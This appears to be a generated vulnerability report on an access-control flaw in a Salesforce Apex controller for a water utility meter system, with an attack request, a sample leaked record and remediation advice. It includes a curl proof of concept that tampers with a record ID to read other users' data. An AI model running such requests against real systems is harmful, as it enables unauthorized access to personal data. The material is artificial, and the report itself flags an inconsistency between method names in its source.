# Security Analysis Report
**System:** AquaGrid Meter Management (Salesforce-Integrated) — v1.9.0 (FINAL)
**Domain:** Water Utilities / Smart Meters
**Example ID:** SF-0039
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.4 | Privilege escalation via parameter tampering on `EventController.updateEvent` — attacker reads any Event record |

---

## Finding 1 — BAC: Privilege Escalation via Parameter Tampering on Event Object (Pattern 2.4)

### Summary
The Apex controller `EventController` on AquaGrid Meter Management (`6b56f9ae.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Event object. Per §5.0 Pattern 2.4, an attacker escalates their effective privilege by tampering with the `eventId` parameter in the Aura framework `POST /aura` payload. The controller's SOQL query contains no ownership predicate, allowing any authenticated session to retrieve Event records belonging to other users. In a water utility / smart meter context, Event records may contain maintenance incident reports, sensor readings, and infrastructure personnel data.

**Context artifact note:** §4.0 defines the Apex method as `getEventDetails`, while §5.0 and the HAR descriptor (§6.0) reference `c.EventController.updateEvent`. This inconsistency exists in context.txt and is documented as-is; both method signatures share the same Apex class, OWD bypass, and missing ownership predicate.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.EventController.updateEvent`
**Affected endpoint:** `POST https://6b56f9ae.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://6b56f9ae.lightning.force.com/aura
Authorization: Bearer 00D6B56F9AE!AR6b56f9ae...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D6B56F9AE!AR6b56f9ae...

message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN",
"params":{"eventId":"001F9AE","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Event Record Returned**
```json
{
  "actions": [
    {
      "id": "1;a",
      "state": "SUCCESS",
      "returnValue": {
        "records": [
          {
            "Id": "001F9AE",
            "Name": "Victim Event Record",
            "OwnerId": "005VICTIM",
            "InternalNotes__c": "CONFIDENTIAL: internal review notes",
            "SensitiveData__c": "SSN: 000-11-8424"
          }
        ]
      },
      "error": []
    }
  ]
}
```

### Evidence Map

| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD=Private bypassed |
| §5.0 Pattern 2.4 | Privilege escalation | Classification | Attacker tampers `eventId` to access victim records |
| §7.0 OWD | Event: Private | Sharing config | Only record owner should have access |
| §8.0 RISK-SF-039 | No `with sharing` | Risk code | Sharing rules not enforced |
| §8.0 RISK-SF-040 | No ownership predicate | Risk code | Any `eventId` accepted |
| HAR descriptor | `c.EventController.updateEvent` | Entry point | Aura action |
| HAR params | `eventId` | `001F9AE` | Victim Event record ID |
| HAR params | `fields` | Full sensitive list | `InternalNotes__c`, `SensitiveData__c` |
| HAR response | `OwnerId` | `005VICTIM` | Differs from attacker's session |
| HAR response | `SensitiveData__c` | `SSN: 000-11-8424` | Water utility personnel PII |

### Steps to Reproduce

```bash
# Step 1 — Authenticate with a valid Salesforce session on 6b56f9ae.lightning.force.com
SESSION="00D6B56F9AE!AR6b56f9ae..."

# Step 2 — Submit Aura action with victim eventId
curl -s -X POST "https://6b56f9ae.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"001F9AE","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'

# Expected (vulnerable): state: "SUCCESS", OwnerId: "005VICTIM", SensitiveData__c: "SSN: 000-11-8424"
# Expected (secure): state: "ERROR" or empty records — INSUFFICIENT_ACCESS
```

### Remediation

1. **Declare controller `with sharing`:**
   ```apex
   public with sharing class EventController { ... }
   ```
2. **Add ownership predicate to SOQL:**
   ```apex
   WHERE Id = :eventId AND OwnerId = :UserInfo.getUserId()
   ```
   plus `WITH SECURITY_ENFORCED`
3. **Validate `eventId`** against the session user's accessible record set before executing the query.
4. **Remove client-controlled `fields` parameter** — define a server-side allowlist for Event fields.
5. **Validate `aura.token`** — the submitted value `undefined` indicates token validation is absent.
6. **Water utilities note:** Event records in this platform may contain smart meter maintenance incidents and sensor failure records. Exposure of `SensitiveData__c` with personnel SSN data breaches NERC CIP and water infrastructure data protection obligations.
